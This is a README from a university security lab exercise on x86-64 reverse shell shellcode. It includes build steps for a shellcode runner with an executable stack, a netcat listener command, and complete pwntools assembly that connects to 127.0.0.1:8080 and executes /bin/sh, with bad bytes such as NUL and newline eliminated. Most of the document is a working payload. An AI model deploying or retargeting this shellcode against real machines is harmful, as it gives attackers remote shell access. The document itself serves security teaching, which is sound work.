# Reverse Shell x86-64

UMass Amherst 2022 Spring CS390R Lab 2

- [Lab Exercise Instruction](Lab%202.pdf)
- [Solution Article](https://silviavali.github.io/blog/2019-01-25-blog-SLAE2/)

### Special characters eliminated

I improve the shellcode such
that `0x00(NUL), 0x0a(LF), 0x0b(VT), 0x0d(CR), 0xff(EOF)` are eliminated.

## Reverse Shell

![](reverse_shell.png)

1. Compile [`shellcode_runner.c`](shellcode_runner.c), which read the shellcode
   from stdin and execute it.

```bash
gcc shellcode_runner.c -z execstack -o shellcode_runner -g
```

2. Listen from local port

```bash
nc -nvlp 8080
```

3. Spawn reverse shell on target machine

```bash
python3 reverse_shell.py
```

## Environments

- x86-64 Linux (VM recommended)
- `python3` environment
  with [`pwntools`](https://github.com/Gallopsled/pwntools)
  installed
- `tmux` if the script is running within an ssh session

## Debug

![](debug.png)

Set `DEBUG = True` to debug the assembly with `gdb`.

## Shellcode

```python
from pwn import *

context.clear(arch='amd64')

# hs//nib/ 0x68732f2f6e69622f
# 127.0.0.1,8080,2 0x0100007f901f0002
#     mov dword ptr [rsp-4], 0x0100007f
#     mov word ptr [rsp-6], 0x901f
#     mov word ptr [rsp-8], 0x2
#     sub rsp, 8
shellcode = asm("""
    xor rax, rax
    mov rdi, rax
    mov dil, 2
    xor rsi, rsi
    mov sil, 1
    xor rdx, rdx
    mov al, 41
    syscall
    mov rdi, rax
    xor rax, rax

    push rax
    xor rbx, rbx
    mov bx, 0x901f
    shl rbx, 0x10
    add rbx, 2
    push rbx

    mov rsi, rsp
    xor rdx, rdx
    mov dl, 16
    xor rax, rax
    mov al, 42
    syscall

    mov rsi, rax
    mov al, 33
    syscall

    inc sil
    mov al, 33
    syscall

    inc sil
    mov al, 33
    syscall

    xor rbx, rbx
    push rbx
    mov rbx, 0x68732f2f6e69622f
    push rbx
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    xor rax, rax
    mov al, 59
    syscall
""")
```
